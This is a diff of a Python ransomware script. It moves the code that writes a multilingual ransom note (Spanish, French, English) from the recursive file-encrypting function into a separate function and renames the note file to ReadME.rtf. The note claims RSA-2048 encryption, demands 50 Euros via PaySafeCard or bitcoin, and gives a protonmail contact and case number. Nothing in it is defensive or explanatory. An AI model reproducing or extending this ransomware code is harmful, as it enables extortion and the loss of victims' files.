@@ -40,31 +40,7 @@ price='50 Euros'
 
 def crypt(text, pwd, path, bitcoin, price,verif ):
 	l= glob.glob(text)
-	archivo = open("RECUPERAR_ARCHIVOS.rtf","wb")
-	archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
-	archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
-	archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo josegarciatorres@protonmail.com \n")
-	archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
-	archivo.write("indicar su numero de expediente: 158465542F \n")
-	archivo.write("A continuacion te seran enviados la contraseña de desencrypcion y el manual explicativo para desencrypcion\n\n")
-	archivo.write("Ten mas cuidado la proxima vez !!!\n \n")
-	archivo.write('-------------------------------------------------------------- \n')
-	archivo.write('Bonjour, Tu te demande surment ce qu´il c´est passé avec tes fichiers ?\nTout tes dossiers - fichiers ont été cryptés avec RSA-2048\n')
-	archivo.write('si tu souhaite les recuperer tu doit payer :' + str(price) +'\n')
-	archivo.write("Tu peut payer par PaySafeCard en envoyant directement le code coupons a l'adresse: josegarciatorres@protonmail.com \n")
-	archivo.write("ou par bitcoin a l´adresse suivante :#" + bitcoin+ "\n")
-	archivo.write("Tu doit faire apparaitre ton nunmero de dossier: 158465542F \n")
-	archivo.write("Le mot de passe de decryptage ainsi que le manuel de decryptage te seront par la suite envoyé \n\n")
-	archivo.write("fait plus attention la prochaine fois !!!\n\n")
-	archivo.write('-------------------------------------------------------------- \n')
-	archivo.write('Hello, You wonder how it happened with your files? \nAll your files were encrypted with RSA-2048 \n ')
-	archivo.write('if you want to retrieve them you have to pay:' + str (price) + '\n')
-	archivo.write("You can pay by PaySafeCard by sending coupons directly to: josegarciatorres@protonmail.com \n")
-	archivo.write("or by bitcoin to the following address: #" + bitcoin + "\n")
-	archivo.write("Enter your file number: 158465542F \ n")
-	archivo.write("The decryption password and the decryption manual will be sent to you \n \n")
-	archivo.write("be careful next time !!! \n")
-	archivo.close()
+
 	for i in l:
 		if os.path.isdir(i):
 			crypt(i+'/*',pwd, path,bitcoin, price,verif)
@@ -103,6 +79,32 @@ price='50 Euros'
 
 #Pasamos lista l de direcciones 
 def howto(l):
+
+	archivo = open("ReadME.rtf","wb")
+	archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
+	archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
+	archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo josegarciatorres@protonmail.com \n")
+	archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
+	archivo.write("indicar su numero de expediente: 158465542F \n")
+	archivo.write("A continuacion te seran enviados la contraseña de desencrypcion y el manual explicativo para desencrypcion\n\n")
+	archivo.write("Ten mas cuidado la proxima vez !!!\n \n")
+	archivo.write('-------------------------------------------------------------- \n')
+	archivo.write('Bonjour, Tu te demande surment ce qu´il c´est passé avec tes fichiers ?\nTout tes dossiers - fichiers ont été cryptés avec RSA-2048\n')
+	archivo.write('si tu souhaite les recuperer tu doit payer :' + str(price) +'\n')
+	archivo.write("Tu peut payer par PaySafeCard en envoyant directement le code coupons a l'adresse: josegarciatorres@protonmail.com \n")
+	archivo.write("ou par bitcoin a l´adresse suivante :#" + bitcoin+ "\n")
+	archivo.write("Tu doit faire apparaitre ton nunmero de dossier: 158465542F \n")
+	archivo.write("Le mot de passe de decryptage ainsi que le manuel de decryptage te seront par la suite envoyé \n\n")
+	archivo.write("fait plus attention la prochaine fois !!!\n\n")
+	archivo.write('-------------------------------------------------------------- \n')
+	archivo.write('Hello, You wonder how it happened with your files? \nAll your files were encrypted with RSA-2048 \n ')
+	archivo.write('if you want to retrieve them you have to pay:' + str (price) + '\n')
+	archivo.write("You can pay by PaySafeCard by sending coupons directly to: josegarciatorres@protonmail.com \n")
+	archivo.write("or by bitcoin to the following address: #" + bitcoin + "\n")
+	archivo.write("Enter your file number: 158465542F \ n")
+	archivo.write("The decryption password and the decryption manual will be sent to you \n \n")
+	archivo.write("be careful next time !!! \n")
+	archivo.close()
 
 	listnoRep=[" "]
 	for i in l:
